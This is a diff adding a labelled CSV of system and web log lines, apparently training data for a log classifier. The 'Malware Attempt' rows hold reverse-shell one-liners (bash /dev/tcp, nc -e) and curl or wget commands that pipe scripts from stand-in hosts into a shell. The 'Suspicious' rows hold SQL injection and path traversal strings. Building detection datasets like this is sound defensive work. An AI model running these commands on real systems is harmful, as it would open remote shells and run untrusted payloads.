@@ -1,0 +1,75 @@
+log_message,label
+"Accepted password for kali from 192.168.1.20 port 22 ssh2",Normal
+"session opened for user root by (uid=0)",Normal
+"CRON[1234]: pam_unix(cron:session): session opened for user root",Normal
+"systemd[1]: Started Daily apt download activities",Normal
+"apache2: server started successfully",Normal
+"Failed password for invalid user admin from 192.168.1.10 port 22 ssh2",Failed Login
+"Failed password for root from 192.168.1.10 port 22 ssh2",Failed Login
+"sshd[2201]: Failed password for invalid user guest from 203.0.113.5 port 22 ssh2",Failed Login
+"GET /phpmyadmin HTTP/1.1 404 512",Suspicious
+"GET /../../../../etc/passwd HTTP/1.1 400 100",Suspicious
+"GET /index.php?id=1' OR '1'='1 HTTP/1.1 500 2048",Suspicious
+"POST /login.php username=admin'-- password=test",Suspicious
+"kernel panic - not syncing: Fatal exception",Critical
+"systemd[1]: Failed to start Apache Web Server",Critical
+"disk failure imminent on /dev/sda",Critical
+"Out of memory: Kill process 2345 (python3)",Critical
+"Detected reverse shell attempt: bash -i >& /dev/tcp/10.0.0.9/4444 0>&1",Malware Attempt
+"wget http://malicious-site.com/payload.sh -O /tmp/payload.sh",Malware Attempt
+"curl http://evil.example.com/dropper | bash",Malware Attempt
+"nc -e /bin/sh 192.168.1.200 4444",Malware Attempt
+"Accepted publickey for kali from 10.0.0.2 port 50422 ssh2",Normal
+"NetworkManager: connected to WiFi network",Normal
+"systemd[1]: Started Session 1 of user kali",Normal
+"kernel: USB device connected successfully",Normal
+"Failed password for invalid user test from 10.0.0.5 port 22 ssh2",Failed Login
+"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=172.16.0.4",Failed Login
+"GET /wp-admin HTTP/1.1 404 490",Suspicious
+"Apache access: suspicious query string UNION SELECT username,password FROM users",Suspicious
+"segfault at 0 ip 00007f error 4 in libc.so",Critical
+"curl -fsSL http://badhost/m.sh | sh",Malware Attempt
+"Accepted password for user john from 192.168.0.5 port 22 ssh2",Normal
+"session closed for user root",Normal
+"systemd[1]: Started Cleanup of Temporary Directories",Normal
+"CRON[2222]: pam_unix(cron:session): session closed for user root",Normal
+"sshd[1023]: Connection closed by 192.168.1.50 port 22",Normal
+"NetworkManager: DHCP lease acquired",Normal
+"Failed password for invalid user oracle from 185.234.217.22 port 22 ssh2",Failed Login
+"Failed password for admin from 103.45.67.89 port 22 ssh2",Failed Login
+"sshd[3021]: Failed password for root from 45.33.32.156 port 22 ssh2",Failed Login
+"authentication failure; rhost=192.168.1.15 user=root",Failed Login
+"Invalid user test from 192.168.1.12 port 22",Failed Login
+"Too many authentication failures for root from 10.10.10.10",Failed Login
+"GET /admin HTTP/1.1 403 721",Suspicious
+"GET /config.php HTTP/1.1 404 321",Suspicious
+"GET /phpinfo.php HTTP/1.1 200 1024",Suspicious
+"GET /?id=1 UNION SELECT NULL,NULL-- HTTP/1.1 500 1234",Suspicious
+"POST /upload.php filename=shell.php",Suspicious
+"GET /cgi-bin/test.cgi HTTP/1.1 404 210",Suspicious
+"systemd[1]: Failed to start MySQL Database Server",Critical
+"kernel: panic occurred due to NULL pointer dereference",Critical
+"EXT4-fs error (device sda1): ext4_find_entry:1458: inode #2",Critical
+"RAID array degraded on /dev/md0",Critical
+"CPU temperature critical threshold exceeded",Critical
+"Power supply failure detected",Critical
+"bash -c 'bash -i >& /dev/tcp/192.168.1.99/8080 0>&1'",Malware Attempt
+"python -c 'import socket,subprocess,os;...'",Malware Attempt
+"nc -nv 10.0.0.10 4444 -e /bin/bash",Malware Attempt
+"chmod +x backdoor.sh && ./backdoor.sh",Malware Attempt
+"wget http://bad-domain.xyz/rootkit.tar.gz",Malware Attempt
+"curl http://malicious.example.net/shell.sh | sh",Malware Attempt
+"Accepted publickey for ubuntu from 172.16.0.2 port 22 ssh2",Normal
+"system reboot initiated by user admin",Normal
+"service nginx started successfully",Normal
+"User kali logged out",Normal
+"Failed password for invalid user postgres from 203.0.113.10 port 22 ssh2",Failed Login
+"authentication error for user admin from 192.168.2.20",Failed Login
+"GET /backup.zip HTTP/1.1 200 204800",Suspicious
+"GET /.env HTTP/1.1 403 210",Suspicious
+"GET /server-status HTTP/1.1 403 150",Suspicious
+"disk read error on /dev/sdb",Critical
+"memory corruption detected in process apache2",Critical
+
+"perl -e 'use Socket;...'",Malware Attempt
+"echo 'malicious code' > /tmp/exploit.sh && sh /tmp/exploit.sh",Malware Attempt
